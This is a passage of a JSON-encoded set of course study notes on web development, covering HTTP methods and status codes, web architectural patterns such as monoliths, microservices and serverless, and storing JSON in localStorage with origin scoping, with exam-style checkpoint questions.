simpler and faster, and handles most read operations. But GET and POST behave differently in several ways you need to know for the exam."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eBehavior\u003c/th\u003e\n\u003cth\u003eGET\u003c/th\u003e\n\u003cth\u003ePOST\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eBookmarkable\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCached by browser\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eStays in browser history\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eSize limit\u003c/td\u003e\n\u003ctd\u003eYes (URL length limit)\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eData location\u003c/td\u003e\n\u003ctd\u003eURL query string\u003c/td\u003e\n\u003ctd\u003eRequest body\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"checkpoint","q":"Which HTTP method can send 1 GB of data?","a":"POST. GET appends data to the URL, which has a length limit. POST places data in the request body, which has no size limit."},{"kind":"checkpoint","q":"GET requests can be bookmarked — true or false?","a":"True. Because GET data appears in the URL, the browser can save and replay the request as a bookmark. POST data is in the body and cannot be bookmarked."},{"kind":"h2","html":"When to use each method","text":"When to use each method"},{"kind":"p","html":"Use the patient API as a mental model:","text":"Use the patient API as a mental model:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eGET\u003c/strong\u003e \u003ccode\u003eAPI/v1/patients/\u003c/code\u003e — get a list of all patients\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGET\u003c/strong\u003e \u003ccode\u003eAPI/v1/patients/1/\u003c/code\u003e — get one patient by ID\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePOST\u003c/strong\u003e \u003ccode\u003eAPI/v1/patients/\u003c/code\u003e — create a new patient (data in body)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePUT\u003c/strong\u003e \u003ccode\u003eAPI/v1/patients/1\u003c/code\u003e — replace patient #1&#39;s record entirely\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePATCH\u003c/strong\u003e \u003ccode\u003eAPI/v1/patients/1\u003c/code\u003e — update one field on patient #1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDELETE\u003c/strong\u003e \u003ccode\u003eAPI/v1/patients/1/\u003c/code\u003e — delete patient #1 (only needs the ID)\u003c/li\u003e\n\u003c/ul\u003e","text":"- **GET** `API/v1/patients/` — get a list of all patients\n- **GET** `API/v1/patients/1/` — get one patient by ID\n- **POST** `API/v1/patients/` — create a new patient (data in body)\n- **PUT** `API/v1/patients/1` — replace patient #1's record entirely\n- **PATCH** `API/v1/patients/1` — update one field on patient #1\n- **DELETE** `API/v1/patients/1/` — delete patient #1 (only needs the ID)"},{"kind":"p","html":"Use POST when sending large amounts of data — POST has no size limitations. Use PUT when you are replacing an object entirely with something new. Use PATCH when you are updating only one property.","text":"Use POST when sending large amounts of data — POST has no size limitations. Use PUT when you are replacing an object entirely with something new. Use PATCH when you are updating only one property."},{"kind":"h2","html":"Status codes","text":"Status codes"},{"kind":"p","html":"Status codes appear in the response headers. The first digit tells you the category.","text":"Status codes appear in the response headers. The first digit tells you the category."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eRange\u003c/th\u003e\n\u003cth\u003eCategory\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e1xx\u003c/td\u003e\n\u003ctd\u003eInformational responses\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2xx\u003c/td\u003e\n\u003ctd\u003eSuccessful responses\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3xx\u003c/td\u003e\n\u003ctd\u003eRedirects\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e4xx\u003c/td\u003e\n\u003ctd\u003eClient errors\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e5xx\u003c/td\u003e\n\u003ctd\u003eServer errors\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Key codes:","text":"Key codes:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e200 OK\u003c/strong\u003e — request succeeded. For GET, the resource was fetched and transmitted. For PUT/POST, the result is transmitted.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e201 Created\u003c/strong\u003e — a new resource was created, typically after POST or some PUT requests.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **200 OK** — request succeeded. For GET, the resource was fetched and transmitted. For PUT/POST, the result is transmitted.\n- **201 Created** — a new resource was created, typically after POST or some PUT requests."},{"kind":"h2","html":"Pitfalls","text":"Pitfalls"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eSending credentials via GET is not safe. GET data appears in the URL — the username and password are visible in browser history, server logs, and any proxy between client and server. Always use POST (or a more secure mechanism) when sending credentials.\u003c/p\u003e","text":"Sending credentials via GET is not safe. GET data appears in the URL — the username and password are visible in browser history, server logs, and any proxy between client and server. Always use POST (or a more secure mechanism) when sending credentials."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e&quot;There are no size limits for both GET and POST&quot; is false. GET appends data to the URL; URLs have a length limit enforced by browsers and servers. POST places data in the body and has no size limit. Exam questions test this directly.\u003c/p\u003e","text":"\"There are no size limits for both GET and POST\" is false. GET appends data to the URL; URLs have a length limit enforced by browsers and servers. POST places data in the body and has no size limit. Exam questions test this directly."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e An API call has four parts — endpoint, headers, body, and HTTP method. GET retrieves and is bookmarkable but has a URL size limit. POST creates and has no size limit. PUT replaces the entire resource; PATCH updates a single property. Status codes group by first digit: 2xx success, 4xx client error, 5xx server error.","text":"**Takeaway:** An API call has four parts — endpoint, headers, body, and HTTP method. GET retrieves and is bookmarkable but has a URL size limit. POST creates and has no size limit. PUT replaces the entire resource; PATCH updates a single property. Status codes group by first digit: 2xx success, 4xx client error, 5xx server error."}]},{"n":15,"id":"web-arch-patterns","title":"Web Architectural Patterns","hook":"Choosing the wrong architecture locks you into a full-shutdown deploy cycle — choosing the right one lets you fix one service without touching the rest.","tags":["architecture","monolithic","microservice","SOA","serverless","MVC"],"module":"Web Architecture and Data Exchange","source":"Slide 2","blocks":[{"kind":"h2","html":"When Facebook goes down, Messenger keeps running","text":"When Facebook goes down, Messenger keeps running"},{"kind":"p","html":"Messenger is a separate service from Facebook&#39;s main app. The two can run on different machines, different technology stacks, and different deployment schedules. If Facebook&#39;s core servers crash, Messenger does not necessarily crash with them.","text":"Messenger is a separate service from Facebook's main app. The two can run on different machines, different technology stacks, and different deployment schedules. If Facebook's core servers crash, Messenger does not necessarily crash with them."},{"kind":"p","html":"That independence is the defining property of MSA (Microservice Architecture, also called SOA — Service-Oriented Architecture — in this course). Before MSA became standard, most web apps were monolithic. Understanding why teams moved away from monolithic architecture requires seeing what monolithic architecture actually costs.","text":"That independence is the defining property of MSA (Microservice Architecture, also called SOA — Service-Oriented Architecture — in this course). Before MSA became standard, most web apps were monolithic. Understanding why teams moved away from monolithic architecture requires seeing what monolithic architecture actually costs."},{"kind":"checkpoint","q":"You deploy a monolithic e-commerce app. You want to add a discount-coupon feature. What must you do to the running app before you can ship the new code?","a":"You must shut down the entire application, add the feature to the unified codebase, recompile the whole thing, and then redeploy. Every user loses access during that window — even parts of the app (checkout, login, product search) that had nothing to do with the change."},{"kind":"h2","html":"Monolithic architecture","text":"Monolithic architecture"},{"kind":"p","html":"All application logic — UI, business logic, data access — lives in a single deployable unit. You build it once, run it on one machine, and maintain one backend technology stack.","text":"All application logic — UI, business logic, data access — lives in a single deployable unit. You build it once, run it on one machine, and maintain one backend technology stack."},{"kind":"p","html":"\u003cstrong\u003ePros:\u003c/strong\u003e","text":"**Pros:**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eSimple to build and deploy for small projects\u003c/li\u003e\n\u003cli\u003eNo inter-service network calls; everything runs in the same process\u003c/li\u003e\n\u003cli\u003eEasy to test end-to-end without mocking external services\u003c/li\u003e\n\u003c/ul\u003e","text":"- Simple to build and deploy for small projects\n- No inter-service network calls; everything runs in the same process\n- Easy to test end-to-end without mocking external services"},{"kind":"p","html":"\u003cstrong\u003eCons:\u003c/strong\u003e","text":"**Cons:**"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eEvery deploy requires a full shutdown and recompile\u003c/li\u003e\n\u003cli\u003eOne failing component can bring down the entire application\u003c/li\u003e\n\u003cli\u003eAs the codebase grows, changes become risky and releases slow\u003c/li\u003e\n\u003c/ul\u003e","text":"- Every deploy requires a full shutdown and recompile\n- One failing component can bring down the entire application\n- As the codebase grows, changes become risky and releases slow"},{"kind":"p","html":"\u003cstrong\u003eBest for:\u003c/strong\u003e prototyping, MVPs, or apps that do not expect frequent independent feature updates.","text":"**Best for:** prototyping, MVPs, or apps that do not expect frequent independent feature updates."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eAdding a single feature to a monolithic app means shutting down the entire application. MSA avoids this by letting you redeploy individual services independently.\u003c/p\u003e","text":"Adding a single feature to a monolithic app means shutting down the entire application. MSA avoids this by letting you redeploy individual services independently."},{"kind":"h2","html":"Layered (n-Tier) architecture","text":"Layered (n-Tier) architecture"},{"kind":"p","html":"Layered architecture divides the application into horizontal slices, each responsible for one functional concern.","text":"Layered architecture divides the application into horizontal slices, each responsible for one functional concern."},{"kind":"code","lang":"text","code":"┌────────────────────────────┐\n│     Presentation Layer     │  ← User interaction (UI)\n├────────────────────────────┤\n│      Business Layer        │  ← Application logic, decision making, routing\n├────────────────────────────┤\n│     Application Layer      │  ← Core functions, shared libraries\n├────────────────────────────┤\n│     Data Access Layer      │  ← Database reads/writes\n└────────────────────────────┘"},{"kind":"p","html":"Each layer talks only to the layer directly below it. The presentation layer never reaches past the business layer to touch the database directly.","text":"Each layer talks only to the layer directly below it. The presentation layer never reaches past the business layer to touch the database directly."},{"kind":"p","html":"This separation of concerns makes the system testable: you can swap out the data access layer (e.g., replace SQL with NoSQL) without rewriting business logic. Core banking platforms use layered design specifically for regulatory compliance — auditors can verify that no UI code directly touches financial records.","text":"This separation of concerns makes the system testable: you can swap out the data access layer (e.g., replace SQL with NoSQL) without rewriting business logic. Core banking platforms use layered design specifically for regulatory compliance — auditors can verify that no UI code directly touches financial records."},{"kind":"checkpoint","q":"In a layered architecture, which layer handles \"should this user be allowed to do this operation?\" — and which layer executes the SQL query to retrieve their account?","a":"Authorization decisions live in the Business Layer (it controls logic and routing). The SQL query runs in the Data Access Layer. These concerns are deliberately separated so that policy changes (business layer) don't require touching database code."},{"kind":"h2","html":"MSA / SOA (Microservice Architecture)","text":"MSA / SOA (Microservice Architecture)"},{"kind":"p","html":"MSA breaks an application into a collection of loosely coupled services. Each service runs independently, owns a single function, and communicates with other services exclusively through API calls.","text":"MSA breaks an application into a collection of loosely coupled services. Each service runs independently, owns a single function, and communicates with other services exclusively through API calls."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eMSA and SOA refer to the same thing in this course. Do not contrast them or treat SOA as a separate, older alternative.\u003c/p\u003e","text":"MSA and SOA refer to the same thing in this course. Do not contrast them or treat SOA as a separate, older alternative."},{"kind":"p","html":"Key characteristics:","text":"Key characteristics:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eEach service can run on a separate machine in a separate geographic region\u003c/li\u003e\n\u003cli\u003eServices are written in different technology stacks (one in Python, another in Node.js)\u003c/li\u003e\n\u003cli\u003eDeploying or fixing one service does not require shutting down others\u003c/li\u003e\n\u003cli\u003eOne team can own one service end-to-end\u003c/li\u003e\n\u003c/ul\u003e","text":"- Each service can run on a separate machine in a separate geographic region\n- Services are written in different technology stacks (one in Python, another in Node.js)\n- Deploying or fixing one service does not require shutting down others\n- One team can own one service end-to-end"},{"kind":"p","html":"\u003cstrong\u003eTrade-offs:\u003c/strong\u003e","text":"**Trade-offs:**"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eAdvantage\u003c/th\u003e\n\u003cth\u003eCost\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eIndependent deployment per service\u003c/td\u003e\n\u003ctd\u003eMore complex overall system\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eTeams can work in parallel\u003c/td\u003e\n\u003ctd\u003eServices communicate only via API — many network round-trips\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eOne failure doesn&#39;t cascade\u003c/td\u003e\n\u003ctd\u003eDistributed debugging is harder\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"\u003cstrong\u003eReal-world users:\u003c/strong\u003e Uber, Netflix, Amazon, eBay, SoundCloud, Groupon, realtor.com (Vancouver-area).","text":"**Real-world users:** Uber, Netflix, Amazon, eBay, SoundCloud, Groupon, realtor.com (Vancouver-area)."},{"kind":"h2","html":"API-centric MSA — the pattern you build in this course","text":"API-centric MSA — the pattern you build in this course"},{"kind":"p","html":"In COMP4537 you practice a specific flavor of MSA where all communication goes through a central API gateway.","text":"In COMP4537 you practice a specific flavor of MSA where all communication goes through a central API gateway."},{"kind":"mermaid","source":"graph LR\n    C[\"Client\\n(HTML + AJAX)\"] --\u003e|HTTP request| G[API Gateway]\n    G --\u003e|JSON| S1[\"User Profile Service\\n(Japan)\"]\n    G --\u003e|JSON| S2[\"Inventory Service\\n(USA)\"]\n    G --\u003e|JSON| S3[\"JSON File Service\\n(UAE)\"]\n    G --\u003e|JSON| S4[\"Another Service\\n(Korea)\"]"},{"kind":"p","html":"The client never calls services directly. The API gateway routes each request to the correct service. Every service returns JSON. Because client and servers are not on the same machine, all responses cross origin — meaning CORS and RESTful design apply.","text":"The client never calls services directly. The API gateway routes each request to the correct service. Every service returns JSON. Because client and servers are not on the same machine, all responses cross origin — meaning CORS and RESTful design apply."},{"kind":"h2","html":"Serverless / Function-as-a-Service (FaaS)","text":"Serverless / Function-as-a-Service (FaaS)"},{"kind":"p","html":"Serverless lets you run small, stateless functions in the cloud without provisioning or managing servers. The server infrastructure is built and maintained by someone else; you access it through API calls.","text":"Serverless lets you run small, stateless functions in the cloud without provisioning or managing servers. The server infrastructure is built and maintained by someone else; you access it through API calls."},{"kind":"p","html":"\u003cstrong\u003eBest for:\u003c/strong\u003e apps with unpredictable or spiky traffic — you pay per invocation, not per idle server. Common uses: image processing, notification dispatch, data transformation pipelines.","text":"**Best for:** apps with unpredictable or spiky traffic — you pay per invocation, not per idle server. Common uses: image processing, notification dispatch, data transformation pipelines."},{"kind":"callout","variant":"example","html":"\u003cp\u003eYour term-one apps with no server-side scripting were effectively serverless — you sent API requests to image or data servers that someone else operated, and received processed results in return.\u003c/p\u003e","text":"Your term-one apps with no server-side scripting were effectively serverless — you sent API requests to image or data servers that someone else operated, and received processed results in return."},{"kind":"checkpoint","q":"What makes an architecture \"serverless\" — and what is the developer actually responsible for?","a":"\"Serverless\" means the infrastructure management (provisioning, scaling, patching) is handled by a cloud provider. The developer is responsible only for the function logic and the API contract. The hardware and runtime still exist — the developer just doesn't manage it."},{"kind":"h2","html":"MVC (Model-View-Controller)","text":"MVC (Model-View-Controller)"},{"kind":"p","html":"MVC organizes application code into three roles:","text":"MVC organizes application code into three roles:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eComponent\u003c/th\u003e\n\u003cth\u003eResponsibility\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eModel\u003c/td\u003e\n\u003ctd\u003eData and business rules\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eView\u003c/td\u003e\n\u003ctd\u003eWhat the user sees (UI rendering)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eController\u003c/td\u003e\n\u003ctd\u003eReceives user input, coordinates Model and View\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Web frameworks built on MVC: Django (Python), Rails (Ruby), ASP.NET MVC (.NET). GitHub&#39;s original codebase was built on Ruby on Rails.","text":"Web frameworks built on MVC: Django (Python), Rails (Ruby), ASP.NET MVC (.NET). GitHub's original codebase was built on Ruby on Rails."},{"kind":"h2","html":"MVVM (Model-View-ViewModel)","text":"MVVM (Model-View-ViewModel)"},{"kind":"p","html":"MVVM is an evolution of MVC designed for rich client-side interfaces that need two-way data binding.","text":"MVVM is an evolution of MVC designed for rich client-side interfaces that need two-way data binding."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eComponent\u003c/th\u003e\n\u003cth\u003eResponsibility\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eModel\u003c/td\u003e\n\u003ctd\u003eData and domain logic\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eView\u003c/td\u003e\n\u003ctd\u003eDeclarative UI template\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eViewModel\u003c/td\u003e\n\u003ctd\u003eExposes data streams; syncs View and Model automatically\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"When the user edits a form field, the ViewModel updates the Model without the developer writing explicit event handlers. Frameworks: Angular, Vue, React with state management libraries.","text":"When the user edits a form field, the ViewModel updates the Model without the developer writing explicit event handlers. Frameworks: Angular, Vue, React with state management libraries."},{"kind":"h2","html":"Patterns can be combined","text":"Patterns can be combined"},{"kind":"p","html":"No real-world system uses exactly one pattern. Netflix started as a monolith, restructured into a layered app, then migrated to microservices, and now layers event-driven processing and CQRS on top of its MSA core. The architectural choice depends on scale, team structure, and change velocity — not ideology.","text":"No real-world system uses exactly one pattern. Netflix started as a monolith, restructured into a layered app, then migrated to microservices, and now layers event-driven processing and CQRS on top of its MSA core. The architectural choice depends on scale, team structure, and change velocity — not ideology."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e Architectural patterns are mechanisms for managing change. Monolithic architecture is cheapest to start; MSA makes independent deployment possible; layered architecture enforces separation of concerns; serverless shifts infrastructure cost to a provider. Choosing a pattern means choosing which kinds of change you want to be easy and which trade-offs you accept.","text":"**Takeaway:** Architectural patterns are mechanisms for managing change. Monolithic architecture is cheapest to start; MSA makes independent deployment possible; layered architecture enforces separation of concerns; serverless shifts infrastructure cost to a provider. Choosing a pattern means choosing which kinds of change you want to be easy and which trade-offs you accept."}]},{"n":16,"id":"json-localstorage","title":"JSON and Web Storage","hook":"localStorage only stores strings — the moment you try to store an object you lose all its structure, unless you know how to use JSON.","tags":["JSON","localStorage","sessionStorage","stringify","parse","origin"],"module":"Web Architecture and Data Exchange","source":"Slide 2, Quiz 5","blocks":[{"kind":"h2","html":"The Problem","text":"The Problem"},{"kind":"p","html":"You want to store a user&#39;s profile object in the browser so it persists across page refreshes. localStorage only stores strings — how do you store an object?","text":"You want to store a user's profile object in the browser so it persists across page refreshes. localStorage only stores strings — how do you store an object?"},{"kind":"code","lang":"js","code":"// This silently breaks — localStorage coerces the object to \"[object Object]\"\nlocalStorage.setItem(\"user\", { name: \"Alice\", role: \"admin\" });\n\n// Correct: serialize first, then store\nlocalStorage.setItem(\"user\", JSON.stringify({ name: \"Alice\", role: \"admin\" }));\n\n// Retrieve and restore the object\nconst user = JSON.parse(localStorage.getItem(\"user\"));"},{"kind":"p","html":"The answer is \u003ccode\u003eJSON.stringify\u003c/code\u003e on the way in, \u003ccode\u003eJSON.parse\u003c/code\u003e on the way out. Everything else in this topic builds on that pair.","text":"The answer is `JSON.stringify` on the way in, `JSON.parse` on the way out. Everything else in this topic builds on that pair."},{"kind":"h2","html":"Web Storage: What It Is","text":"Web Storage: What It Is"},{"kind":"p","html":"Before HTML5, cookies were the only client-side storage option. Web storage replaced them for most use cases: it is more secure, holds much more data (generally 5 MB), and never leaves the browser automatically.","text":"Before HTML5, cookies were the only client-side storage option. Web storage replaced them for most use cases: it is more secure, holds much more data (generally 5 MB), and never leaves the browser automatically."},{"kind":"p","html":"Web storage is \u003cstrong\u003eclient-side only\u003c/strong\u003e — it lives in your browser&#39;s local data. The server never receives it unless you send it explicitly.","text":"Web storage is **client-side only** — it lives in your browser's local data. The server never receives it unless you send it explicitly."},{"kind":"p","html":"Web storage is scoped to the \u003cstrong\u003eorigin\u003c/strong\u003e (protocol + domain + port). All pages sharing the same origin share the same storage. Pages at a different origin cannot read or write it.","text":"Web storage is scoped to the **origin** (protocol + domain + port). All pages sharing the same origin share the same storage. Pages at a different origin cannot read or write it."},{"kind":"h2","html":"localStorage vs sessionStorage","text":"localStorage vs sessionStorage"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003elocalStorage\u003c/th\u003e\n\u003cth\u003esessionStorage\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eExpiry\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eNo expiration — data persists until explicitly deleted\u003c/td\u003e\n\u003ctd\u003eSession only — deleted when the browser tab closes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eScope\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eAll tabs and windows sharing the same origin\u003c/td\u003e\n\u003ctd\u003eSingle tab only\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eUse case\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003ePersistent preferences, cached data\u003c/td\u003e\n\u003ctd\u003eTemporary state (e.g., form wizard progress)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Before using either, check browser support:","text":"Before using either, check browser support:"},{"kind":"code","lang":"js","code":"if (typeof Storage !== \"undefined\") {\n  // Web storage is available\n} else {\n  // Not supported — fall back to cookies or server-side storage\n}"},{"kind":"h2","html":"The localStorage API","text":"The localStorage API"},{"kind":"p","html":"All keys and values are stored as strings.","text":"All keys and values are stored as strings."},{"kind":"code","lang":"js","code":"// Store\nlocalStorage.setItem(\"theme\", \"dark\");\n\n// Retrieve — returns the string value, or null if the key doesn't exist\nconst theme = localStorage.getItem(\"theme\"); // \"dark\"\n\n// Remove one item\nlocalStorage.removeItem(\"theme\");\n\n// Clear all items for this origin\nlocalStorage.clear();"},{"kind":"checkpoint","q":"After this sequence runs, what does `console.log(value)` print?\n```js\nlocalStorage.setItem(\"color\", \"blue\");\nconst value = localStorage.getItem(\"color\"); // \"blue\" captured here\nlocalStorage.removeItem(\"color\");\nlocalStorage.setItem(\"color\", \"red\");\nconsole.log(value);\n```","a":"`\"blue\"`. `getItem` returned the string `\"blue\"` at the moment it was called. The variable `value` holds that string. Later changes to localStorage do not retroactively change `value`."},{"kind":"h2","html":"JSON: Serializing Objects for Storage and Transport","text":"JSON: Serializing Objects for Storage and Transport"},{"kind":"p","html":"localStorage stores only strings. To store a JavaScript object, convert it to a JSON string first.","text":"localStorage stores only strings. To store a JavaScript object, convert it to a JSON string first."},{"kind":"p","html":"\u003cstrong\u003eFlatten (object → string):\u003c/strong\u003e","text":"**Flatten (object → string):**"},{"kind":"code","lang":"js","code":"const user = { name: \"Alice\", role: \"admin\" };\nconst serialized = JSON.stringify(user);\n// '{\"name\":\"Alice\",\"role\":\"admin\"}'\nlocalStorage.setItem(\"user\", serialized);"},{"kind":"p","html":"\u003cstrong\u003eRestore (string → object):\u003c/strong\u003e","text":"**Restore (string → object):**"},{"kind":"code","lang":"js","code":"const serialized = localStorage.getItem(\"user\");\nconst user = JSON.parse(serialized);\n// { name: \"Alice\", role: \"admin\" }"},{"kind":"p","html":"JSON is a flat string. It behaves like any other string in transit or storage — only \u003ccode\u003eJSON.parse\u003c/code\u003e reconstructs the object structure.","text":"JSON is a flat string. It behaves like any other string in transit or storage — only `JSON.parse` reconstructs the object structure."},{"kind":"p","html":"Nested objects are valid JSON:","text":"Nested objects are valid JSON:"},{"kind":"code","lang":"json","code":"{\"user\": {\"profile\": {\"name\": \"Alice\"}}}"},{"kind":"p","html":"The only built-in JSON methods are \u003ccode\u003eJSON.stringify()\u003c/code\u003e and \u003ccode\u003eJSON.parse()\u003c/code\u003e. There is no \u003ccode\u003eJSON.convert()\u003c/code\u003e.","text":"The only built-in JSON methods are `JSON.stringify()` and `JSON.parse()`. There is no `JSON.convert()`."},{"kind":"h2","html":"Origin Scope — The Critical Rule","text":"Origin Scope — The Critical Rule"},{"kind":"p","html":"Web storage is per \u003cstrong\u003eorigin\u003c/strong\u003e (protocol + domain + port). The path component of a URL is irrelevant.","text":"Web storage is per **origin** (protocol + domain + port). The path component of a URL is irrelevant."},{"kind":"p","html":"All three of these pages share exactly the same localStorage:","text":"All three of these pages share exactly the same localStorage:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttp://myDomain.com/write.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://myDomain.com/read.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://myDomain.com/fetch.html\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","text":"- `http://myDomain.com/write.html`\n- `http://myDomain.com/read.html`\n- `http://myDomain.com/fetch.html`"},{"kind":"p","html":"They share the same protocol (\u003ccode\u003ehttp\u003c/code\u003e), domain (\u003ccode\u003emyDomain.com\u003c/code\u003e), and port (implicit 80).","text":"They share the same protocol (`http`), domain (`myDomain.com`), and port (implicit 80)."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eThings that DO break origin:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttps://myDomain.com/read.html\u003c/code\u003e — different protocol (\u003ccode\u003ehttps\u003c/code\u003e vs \u003ccode\u003ehttp\u003c/code\u003e) → different origin → blocked\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://sub.myDomain.com/read.html\u003c/code\u003e — different subdomain → different origin → blocked\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttps://lab.aaa.com/1/index.html\u003c/code\u003e cannot access localStorage written by \u003ccode\u003ehttps://aaa.com/labs/1/index.html\u003c/code\u003e — even though the domain looks similar, \u003ccode\u003elab.aaa.com\u003c/code\u003e is a different subdomain from \u003ccode\u003eaaa.com\u003c/code\u003e → different origin\u003c/li\u003e\n\u003c/ul\u003e","text":"Things that DO break origin:\n- `https://myDomain.com/read.html` — different protocol (`https` vs `http`) → different origin → blocked\n- `http://sub.myDomain.com/read.html` — different subdomain → different origin → blocked\n- `https://lab.aaa.com/1/index.html` cannot access localStorage written by `https://aaa.com/labs/1/index.html` — even though the domain looks similar, `lab.aaa.com` is a different subdomain from `aaa.com` → different origin"},{"kind":"checkpoint","q":"`https://aaa.com/labs/1/index.html` stores a value. Which URL can read it?\n- A: `https://lab.aaa.com/1/index.html`\n- B: `https://aaa.com/labs/5/hello.html`","a":"B. Same protocol (`https`), same domain (`aaa.com`), same port (443). The path `/labs/5/hello.html` is irrelevant. A is blocked because `lab.aaa.com` is a different subdomain."},{"kind":"h2","html":"Viewing localStorage in DevTools","text":"Viewing localStorage in DevTools"},{"kind":"p","html":"Open Chrome DevTools → \u003cstrong\u003eApplication\u003c/strong\u003e tab → Storage → Local Storage. You can inspect, edit, and delete entries there.","text":"Open Chrome DevTools → **Application** tab → Storage → Local Storage. You can inspect, edit, and delete entries there."},{"kind":"h2","html":"Cross-Browser Isolation","text":"Cross-Browser Isolation"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003elocalStorage is browser-specific. Data stored in Chrome is not accessible from Firefox, even on the same machine. &quot;Persistent&quot; means persistent within a single browser, not across all browsers on the device.\u003c/p\u003e","text":"localStorage is browser-specific. Data stored in Chrome is not accessible from Firefox, even on the same machine. \"Persistent\" means persistent within a single browser, not across all browsers on the device."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e localStorage persists strings by origin (protocol + domain + port) — path is irrelevant, but protocol and subdomain matter. Use \u003ccode\u003eJSON.stringify\u003c/code\u003e to store objects and \u003ccode\u003eJSON.parse\u003c/code\u003e to restore them. \u003ccode\u003egetItem\u003c/code\u003e captures a string at call time — subsequent storage changes do not alter variables that already 